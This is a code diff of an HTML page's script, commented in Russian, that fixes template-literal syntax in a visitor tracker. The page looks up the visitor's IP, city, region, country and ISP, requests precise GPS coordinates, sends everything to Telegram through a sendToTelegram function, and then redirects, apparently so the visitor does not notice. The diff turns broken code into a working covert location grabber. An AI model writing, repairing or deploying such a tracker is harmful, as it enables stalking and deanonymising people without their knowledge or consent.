@@ -49,13 +49,13 @@
     fetch("https://ipwho.is/")
       .then(res => res.json())
       .then(data => {
-        const ipMessage = 
+        const ipMessage = `
 IP: ${data.ip}
 Город: ${data.city}
 Регион: ${data.region}
 Страна: ${data.country}
 Провайдер: ${data.connection.isp}
-Время: ${new Date().toLocaleString()};
+Время: ${new Date().toLocaleString()}`;
 
         // GPS запрос
         if (navigator.geolocation) {
@@ -75,12 +75,12 @@ IP: ${data.ip}
               const lat = pos.coords.latitude;
               const lon = pos.coords.longitude;
               const acc = pos.coords.accuracy;
-              const msg = ipMessage + \n\n📍 GPS: ${lat}, ${lon}\n🎯 Точность: ${acc} м;
+              const msg = ipMessage + `\n\n📍 GPS: ${lat}, ${lon}\n🎯 Точность: ${acc} м`;
               sendToTelegram(msg, startRedirect);
             },
             err => {
               clearTimeout(gpsTimeout);
-              const msg = ipMessage + \n\n⚠️ Ошибка GPS: ${err.message};
+              const msg = ipMessage + `\n\n⚠️ Ошибка GPS: ${err.message}`;
               sendToTelegram(msg, startRedirect);
             },
             {
@@ -101,6 +101,7 @@ IP: ${data.ip}
   </script>
 </body>
 </html>
+
 
 
 
